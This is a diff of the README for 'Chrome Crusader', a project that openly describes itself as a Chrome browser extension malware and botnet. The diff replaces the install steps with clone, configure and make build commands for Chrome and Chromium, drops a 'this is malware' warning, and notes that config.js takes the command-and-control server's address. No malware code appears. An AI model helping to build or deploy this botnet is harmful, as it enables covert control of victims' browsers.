@@ -1,20 +1,34 @@
 [![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://github.com/lillypad/chrome-crusader/blob/master/LICENSE)
 [![Python 2](https://img.shields.io/badge/Python-2-brightgreen.svg)](https://github.com/lillypad/chrome-crusader/)
 [![Python 3](https://img.shields.io/badge/Python-3-brightgreen.svg)](https://github.com/lillypad/chrome-crusader/)
+[![PyPI](https://img.shields.io/pypi/v/nine.svg)](https://github.com/lillypad/chrome-crusader/)
 
 # Chrome Crusader
 
+![Chrome Crusader](docs/presentation/img/chrome_pony_evil.png)
+
+# Description
+
 Chrome Crusader is a Google Chrome browser extension malware / botnet.
 
-**NOTE: THIS IS MALWARE USE AT YOUR OWN RISK!**
-
-# Installing Chrome Extension
+# Building Chrome Extension
 
 ```bash
-git clone https://github.com/lillypad/browser-bandit.git
-cd browser-bandit/
-nano -w chrome-optimizer/config.js
-chrome --load-extension=chrome-optimizer/
+git clone https://github.com/lillypad/chrome-crusader.git
+cd chrome-crusader/
+pip install --user -r requirements.txt
+./configure.sh
+make chrome
+```
+
+# Building Chromium Extension
+
+```bash
+git clone https://github.com/lillypad/chrome-crusader.git
+cd chrome-crusader/
+pip install --user -r requirements.txt
+./configure.sh
+make chromium
 ```
 
 `config.js` should be setup with the CnC server's IP address and port.
